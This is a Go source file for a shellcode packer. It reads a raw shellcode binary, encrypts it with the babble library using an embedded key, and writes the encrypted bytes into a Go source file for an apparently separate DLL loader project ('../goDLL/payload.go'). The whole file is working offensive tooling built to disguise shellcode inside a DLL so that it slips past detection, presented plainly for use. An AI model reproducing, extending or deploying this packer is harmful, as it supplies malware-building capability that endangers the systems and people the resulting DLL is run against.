package main

import (
    "flag"
    _ "embed"
    "fmt"
    "os"

    "github.com/mjwhitta/babble"
)

//go:generate ./bytemap key.bin

//go:embed key.bin
var keyBytes []byte

var flags = struct {
    payload *string
}{
    payload: flag.String(
	"payload",
	"",
	"Path to shellcode binary file",
    ),
}

func check(e error) {
    if e != nil {
	panic(e)
    }
}

func main() {
    var e error
    var k *babble.Key
    var enc_bytes []byte
    var dllpayloadfilename string = "../goDLL/payload.go"
    var dllpayloadfile *os.File
    var footer string = "-----END BABBLE-----"
    var header string = "-----BEGIN BABBLE-----"

    flag.Parse()
    if *flags.payload == "" {
	fmt.Println("Shellcode file is required, exiting...")
	os.Exit(1)
    }
    k, e = babble.NewKeyFromBytes(keyBytes, &babble.ByteMode{})
    check(e)

    enc_bytes, e = babble.EncryptFile(*flags.payload, k)
    check(e)
    enc_bytes = enc_bytes[len(header) : len(enc_bytes)-len(footer)] 
    
    dllpayloadfile, e = os.Create(dllpayloadfilename)
    check(e)
    defer dllpayloadfile.Close()

    dllpayloadfile.WriteString(
	"package main\n\n",

    )
    dllpayloadfile.WriteString("var buf = []byte { ")
    for i := 0; i < len(enc_bytes); i++ {
	tmpstr := fmt.Sprintf("%v", enc_bytes[i])
	if i != (len(enc_bytes) - 1) {
	    tmpstr += ", "
	}
	dllpayloadfile.WriteString(tmpstr)
    }
    dllpayloadfile.WriteString(" }\n\n")
}

